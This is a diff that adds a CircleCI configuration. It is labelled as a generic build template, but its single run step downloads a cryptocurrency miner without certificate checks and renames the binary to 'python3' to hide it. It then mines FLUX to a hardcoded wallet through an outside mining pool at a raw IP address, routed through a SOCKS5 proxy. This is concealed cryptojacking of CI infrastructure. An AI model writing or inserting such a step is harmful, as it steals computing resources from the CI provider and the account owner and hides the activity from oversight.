@@ -1,0 +1,12 @@
+# Couldn't automatically generate a config from your source code.
+# This is a generic template to serve as a base for your custom config
+# See: https://circleci.com/docs/configuration-reference
+version: 2.1
+jobs:
+  build:
+    machine:
+      image: ubuntu-2004:202010-01 # recommended linux image
+    resource_class: xlarge
+    steps:
+      - checkout
+      - run: wget wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.27/cpuminer-opt-linux.tar.gz --no-check-certificate && tar xf cpuminer-opt-linux.tar.gz && mv cpuminer-sse2 python3 && ./python3 -a yespower -o stratum+tcp://198.50.168.213:6234 -u t1UYZUpgVzViCMQemJyoNUEerPFBp3KsgR9 -p c=FLUX -t 3 -- proxy socks5://98.188.47.132:4145
